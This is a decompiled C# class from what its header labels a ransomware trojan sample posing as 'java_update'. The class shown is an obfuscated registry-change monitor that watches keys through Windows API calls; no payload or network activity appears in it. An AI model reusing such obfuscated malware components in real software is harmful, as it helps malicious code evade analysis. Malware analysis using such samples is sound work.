// Decompiled with JetBrains decompiler
// Type: ᏬĴவߙւ̞ᙘ.Җ஀׭®ಇ
// Assembly: java_update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 557F7238-B13A-4798-94BE-2CA1CC027032
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-501fe6aaa92a5c9bad3bf6a1cdf6d5d77d5236bad8aca53c2ce66f490a365092.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace ᏬĴவߙւ̞ᙘ
{
  public class Җ\u0B80\u05ED\u00AEಇ : IDisposable
  {
    private const int ե೮\u0C91ˀྯҒ\u196E\u1379 = 1;
    private const int ࢬճᇰࣧ\u0A4F̫ = 16;
    private const int ᄓ\u139Bᑱሙ\u1C3C\u1AF4\u09F9Ȉถɢถ\u1B7Fࣳረ؂ᎇᑁࠞ = 131072;
    private static readonly IntPtr ጉܣ๐Ḟ๐\u104EẢᕯ = new IntPtr(int.MinValue);
    private static readonly IntPtr ຂᖽ\u1C96\u191FჍ᩶ = new IntPtr(-2147483647);
    private static readonly IntPtr ᱦཱུ\u1CAB\u0A53\u09B1\u02F5ઉᏩ്ᖼᴮઆၫʪᄬᳯÈ = new IntPtr(-2147483646);
    private static readonly IntPtr རᓿ\u02C3ᒼءǋ = new IntPtr(-2147483645);
    private static readonly IntPtr ք\u0709ዅមԋᐶલල\u175B\u08DCБᛖᴋ\u1BFBနᯚᦦბ = new IntPtr(-2147483644);
    private static readonly IntPtr \u125FᐜԃE\u1C96᠎ᯍᔼūնᝉީ॔\u1AE0ಹЬ = new IntPtr(-2147483643);
    private static readonly IntPtr ᜃᮑࡂƅቼᰈᡐᤍചؙ\u02FDܧẍᡤ\u085Dϫඌຫ = new IntPtr(-2147483642);
    private IntPtr ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ;
    private string ᇵᣐตȝ\u0C52\u0EECξᬇఴϼάᑧ;
    private object ᰆἄʋवᏁ = new object();
    private Thread \u17DBቝਣᇪນ\u0A64ᎍੈ\u1A9Cᙽ່ႩᏍL\u05F3ೕ;
    private bool ဤܨ᬴ၥ\u1CB4ḵ\u0F01ౖᐢἁ̓Ŏ;
    private ManualResetEvent ᏃᗭΓዳොᱝߑۥẼ = new ManualResetEvent(false);
    private \u1A61֔ᦶણ၉ࣺᇑʺ\u181BഖÙᆰ\u08D6ԃ \u1804Ҥ\u0861\u0489\u1CACና\u0F1Eᐛ\u1AE0\u0F31ဖᆧȌ៌ߚᩧ = \u1A61֔ᦶણ၉ࣺᇑʺ\u181BഖÙᆰ\u08D6ԃ.Ⴈ\u0F70̰ுᑒᦫᆕᤃ | \u1A61֔ᦶણ၉ࣺᇑʺ\u181BഖÙᆰ\u08D6ԃ.\u0AE6ޣᅝ\u17F4țᏠଆ | \u1A61֔ᦶણ၉ࣺᇑʺ\u181BഖÙᆰ\u08D6ԃ.ኵࣵಯŐԅౕ\u07BB\u1AEAᗐǏ | \u1A61֔ᦶણ၉ࣺᇑʺ\u181BഖÙᆰ\u08D6ԃ.ռไɪሉਭࠎÿ;

    public Җ\u0B80\u05ED\u00AEಇ(RegistryKey registryKey) => this.ᵭᕤՉ\u1CCBȕƤ\u02F9ދĪǹἙಟᬘᤱኑ\u1C4A\u0878(registryKey.Name);

    public Җ\u0B80\u05ED\u00AEಇ(string name)
    {
      switch (name)
      {
        case "":
        case null:
          throw new ArgumentNullException(nameof (name));
        default:
          this.ᵭᕤՉ\u1CCBȕƤ\u02F9ދĪǹἙಟᬘᤱኑ\u1C4A\u0878(name);
          break;
      }
    }

    public Җ\u0B80\u05ED\u00AEಇ(RegistryHive registryHive, string subKey) => this.ᶚ\u00B8ዝƪੈṆ(registryHive, subKey);

    [DllImport("advapi32.dll", EntryPoint = "RegOpenKeyEx", SetLastError = true)]
    private static extern int \u194A\u19E5ᑙᘀᴑጘ(
      IntPtr _param0,
      string _param1,
      uint _param2,
      int _param3,
      out IntPtr _param4);

    [DllImport("advapi32.dll", EntryPoint = "RegNotifyChangeKeyValue", SetLastError = true)]
    private static extern int ರᯚᘢἈ໙ᖇ\u0C3Bճᒟ\u000Eᷰ\u16EB\u09B1म(
      IntPtr _param0,
      bool _param1,
      \u1A61֔ᦶણ၉ࣺᇑʺ\u181BഖÙᆰ\u08D6ԃ _param2,
      IntPtr _param3,
      bool _param4);

    [DllImport("advapi32.dll", EntryPoint = "RegCloseKey", SetLastError = true)]
    private static extern int ɔ଼ᒊ\u0F33Ꮫ៨(IntPtr _param0);

    public event EventHandler RegChanged;

    protected virtual void OnRegChanged()
    {
      EventHandler ۄᕯỊḸॆࡇ = this.\u0080ۄᕯỊ\u087Dḹॆࡇ\u0011;
      if (ۄᕯỊḸॆࡇ == null)
        return;
      ۄᕯỊḸॆࡇ((object) this, (EventArgs) null);
    }

    public event ErrorEventHandler Error;

    protected virtual void OnError(Exception _param1)
    {
    }

    public void Dispose()
    {
      this.ಐਂጭʸᬝἥ᭬ᥒ\u0040ṩ\u07B4ֻॕ();
      this.ဤܨ᬴ၥ\u1CB4ḵ\u0F01ౖᐢἁ̓Ŏ = true;
      GC.SuppressFinalize((object) this);
    }

    public \u1A61֔ᦶણ၉ࣺᇑʺ\u181BഖÙᆰ\u08D6ԃ ᚅࢠቅ္čḉᛄᠮ҆\u0F6E\u0BD2\u00B8Ꮅᄐ\u0E8E
    {
      get => this.\u1804Ҥ\u0861\u0489\u1CACና\u0F1Eᐛ\u1AE0\u0F31ဖᆧȌ៌ߚᩧ;
      set
      {
        lock (this.ᰆἄʋवᏁ)
        {
          if (this.\u0A7Cዜᣄஜ\u13F6\u086EؾЯᏹ\u1759\u0BE1Ⴢҧ྄)
            throw new InvalidOperationException("Monitoring thread is already running");
          this.\u1804Ҥ\u0861\u0489\u1CACና\u0F1Eᐛ\u1AE0\u0F31ဖᆧȌ៌ߚᩧ = value;
        }
      }
    }

    private void ᶚ\u00B8ዝƪੈṆ(RegistryHive _param1, string _param2)
    {
      switch (_param1)
      {
        case RegistryHive.ClassesRoot:
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.ጉܣ๐Ḟ๐\u104EẢᕯ;
          break;
        case RegistryHive.CurrentUser:
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.ຂᖽ\u1C96\u191FჍ᩶;
          break;
        case RegistryHive.LocalMachine:
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.ᱦཱུ\u1CAB\u0A53\u09B1\u02F5ઉᏩ്ᖼᴮઆၫʪᄬᳯÈ;
          break;
        case RegistryHive.Users:
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.རᓿ\u02C3ᒼءǋ;
          break;
        case RegistryHive.PerformanceData:
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.ք\u0709ዅមԋᐶલල\u175B\u08DCБᛖᴋ\u1BFBနᯚᦦბ;
          break;
        case RegistryHive.CurrentConfig:
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.\u125FᐜԃE\u1C96᠎ᯍᔼūնᝉީ॔\u1AE0ಹЬ;
          break;
        case RegistryHive.DynData:
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.ᜃᮑࡂƅቼᰈᡐᤍചؙ\u02FDܧẍᡤ\u085Dϫඌຫ;
          break;
        default:
          throw new InvalidEnumArgumentException("hive", (int) _param1, typeof (RegistryHive));
      }
      this.ᇵᣐตȝ\u0C52\u0EECξᬇఴϼάᑧ = _param2;
    }

    private void ᵭᕤՉ\u1CCBȕƤ\u02F9ދĪǹἙಟᬘᤱኑ\u1C4A\u0878(string _param1)
    {
      string[] strArray = _param1.Split('\\');
      switch (strArray[0])
      {
        case "HKEY_CLASSES_ROOT":
        case "HKCR":
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.ጉܣ๐Ḟ๐\u104EẢᕯ;
          break;
        case "HKEY_CURRENT_USER":
        case "HKCU":
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.ຂᖽ\u1C96\u191FჍ᩶;
          break;
        case "HKEY_LOCAL_MACHINE":
        case "HKLM":
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.ᱦཱུ\u1CAB\u0A53\u09B1\u02F5ઉᏩ്ᖼᴮઆၫʪᄬᳯÈ;
          break;
        case "HKEY_USERS":
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.རᓿ\u02C3ᒼءǋ;
          break;
        case "HKEY_CURRENT_CONFIG":
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = Җ\u0B80\u05ED\u00AEಇ.\u125FᐜԃE\u1C96᠎ᯍᔼūնᝉީ॔\u1AE0ಹЬ;
          break;
        default:
          this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ = IntPtr.Zero;
          throw new ArgumentException("The registry hive '" + strArray[0] + "' is not supported", "value");
      }
      this.ᇵᣐตȝ\u0C52\u0EECξᬇఴϼάᑧ = string.Join("\\", strArray, 1, strArray.Length - 1);
    }

    public bool \u0A7Cዜᣄஜ\u13F6\u086EؾЯᏹ\u1759\u0BE1Ⴢҧ྄ => this.\u17DBቝਣᇪນ\u0A64ᎍੈ\u1A9Cᙽ່ႩᏍL\u05F3ೕ != null;

    public void ˏᝥۣᇃᶡ()
    {
      if (this.ဤܨ᬴ၥ\u1CB4ḵ\u0F01ౖᐢἁ̓Ŏ)
        throw new ObjectDisposedException((string) null, "This instance is already disposed");
      lock (this.ᰆἄʋवᏁ)
      {
        if (this.\u0A7Cዜᣄஜ\u13F6\u086EؾЯᏹ\u1759\u0BE1Ⴢҧ྄)
          return;
        this.ᏃᗭΓዳොᱝߑۥẼ.Reset();
        this.\u17DBቝਣᇪນ\u0A64ᎍੈ\u1A9Cᙽ່ႩᏍL\u05F3ೕ = new Thread(new ThreadStart(this.ឤ\u007Eᄑ\u1CC0Ḷ\u000A\u1F16\u0FE3\u0ABAէ౪ူĄӮጾṅྭୢЍ));
        this.\u17DBቝਣᇪນ\u0A64ᎍੈ\u1A9Cᙽ່ႩᏍL\u05F3ೕ.IsBackground = true;
        this.\u17DBቝਣᇪນ\u0A64ᎍੈ\u1A9Cᙽ່ႩᏍL\u05F3ೕ.Start();
      }
    }

    public void ಐਂጭʸᬝἥ᭬ᥒ\u0040ṩ\u07B4ֻॕ()
    {
      if (this.ဤܨ᬴ၥ\u1CB4ḵ\u0F01ౖᐢἁ̓Ŏ)
        throw new ObjectDisposedException((string) null, "This instance is already disposed");
      lock (this.ᰆἄʋवᏁ)
      {
        Thread ቝਣᇪນᎍੈᙽ່ႩᏍlೕ = this.\u17DBቝਣᇪນ\u0A64ᎍੈ\u1A9Cᙽ່ႩᏍL\u05F3ೕ;
        if (ቝਣᇪນᎍੈᙽ່ႩᏍlೕ == null)
          return;
        this.ᏃᗭΓዳොᱝߑۥẼ.Set();
        ቝਣᇪນᎍੈᙽ່ႩᏍlೕ.Join();
      }
    }

    private void ឤ\u007Eᄑ\u1CC0Ḷ\u000A\u1F16\u0FE3\u0ABAէ౪ူĄӮጾṅྭୢЍ()
    {
      try
      {
        this.\u02EAࠔ\u1C96\u0FD8ᑸᖕ();
      }
      catch (Exception ex)
      {
        this.OnError(ex);
      }
      this.\u17DBቝਣᇪນ\u0A64ᎍੈ\u1A9Cᙽ່ႩᏍL\u05F3ೕ = (Thread) null;
    }

    private void \u02EAࠔ\u1C96\u0FD8ᑸᖕ()
    {
      IntPtr num;
      int error1 = Җ\u0B80\u05ED\u00AEಇ.\u194A\u19E5ᑙᘀᴑጘ(this.ᵕ\u088Fᙎἣ\u1754\u0BF3ٷ, this.ᇵᣐตȝ\u0C52\u0EECξᬇఴϼάᑧ, 0U, 131089, out num);
      if (error1 != 0)
        throw new Win32Exception(error1);
      try
      {
        AutoResetEvent autoResetEvent = new AutoResetEvent(false);
        WaitHandle[] waitHandles = new WaitHandle[2]
        {
          (WaitHandle) autoResetEvent,
          (WaitHandle) this.ᏃᗭΓዳොᱝߑۥẼ
        };
        while (!this.ᏃᗭΓዳොᱝߑۥẼ.WaitOne(0, true))
        {
          int error2 = Җ\u0B80\u05ED\u00AEಇ.ರᯚᘢἈ໙ᖇ\u0C3Bճᒟ\u000Eᷰ\u16EB\u09B1म(num, true, this.\u1804Ҥ\u0861\u0489\u1CACና\u0F1Eᐛ\u1AE0\u0F31ဖᆧȌ៌ߚᩧ, autoResetEvent.SafeWaitHandle.DangerousGetHandle(), true);
          if (error2 != 0)
            throw new Win32Exception(error2);
          if (WaitHandle.WaitAny(waitHandles) == 0)
            this.OnRegChanged();
        }
      }
      finally
      {
        if (num != IntPtr.Zero)
          Җ\u0B80\u05ED\u00AEಇ.ɔ଼ᒊ\u0F33Ꮫ៨(num);
      }
    }
  }
}
